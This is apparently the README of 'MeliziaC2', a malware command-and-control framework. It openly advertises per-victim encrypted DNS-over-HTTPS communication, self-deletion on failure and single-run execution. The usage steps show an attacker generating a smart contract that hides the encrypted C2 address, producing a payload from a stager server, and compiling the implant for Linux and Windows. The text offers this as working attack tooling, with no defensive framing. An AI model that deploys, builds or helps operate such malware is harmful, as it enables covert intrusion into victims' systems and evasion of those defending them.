# MeliziaC2
DNS over HTTPS targeted malware (only runs once)

<p align="center">
  <img src="./logo.jpg" width="500">
</p>

## Key Features
- [x] Auto-delete malware on failure
- [x] Fully encrypted (per victim RSA key) DoH (DNS-over-HTTPS) communication
- [x] Malware only runs once!   

## Diagram

![diagram](./melizia_diagram.svg)


## Usage Steps

###### 1 - Generate and deploy smart contract (contains the AES encrypted DNS address of server)
```
attacker_machine@ThreatActor:$ python3 contract_generator.py 
[...]
Calculating keccak from :: ImTWdbREqskoawYAXzEB()

Contract address :: 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6
Encrypted C2 address :: weTq1JD5gpk4Guv/9wTXXhcXgxI+0V+aQPKly7F0rdM=
Contract key :: 9o2goajTJ3ivI+DLB+rRzw==
Generated contract variable name :: ImTWdbREqskoawYAXzEB
Contract keccak :: 7941b5a6

gen_payload primaryServerIP:port 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6 9o2goajTJ3ivI+DLB+rRzw== 7941b5a6
```

###### 2 - Generate payload using the returned parameters
```
attacker_stager_server@Stager:$ python3 server_rust.py 
Server running!
> gen_payload stagerServerPublicIP:stagerServerExposedPort(1337 by default) 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6 9o2goajTJ3ivI+DLB+rRzw== 7941b5a6
Smart contract address :: 0xD3E71479BB2A8b3ba6724636C41b836bD2dFe5B6
Smart contract Keccak :: 7941b5a6
Generated payload with hash :: b'8822a96ba043c606b16ede401cb4a22f2a57c63214311c4ed21f5c705a5d7687'

> 
```

###### 3 - Compile payload
```

```


## Compilation
###### Static compile
```
rustup target add x86_64-unknown-linux-musl
cargo build --release --target=x86_64-unknown-linux-musl

or (windows)

rustup target add x86_64-pc-windows-gnu
cargo build --release --target=x86_64-pc-windows-gnu
```


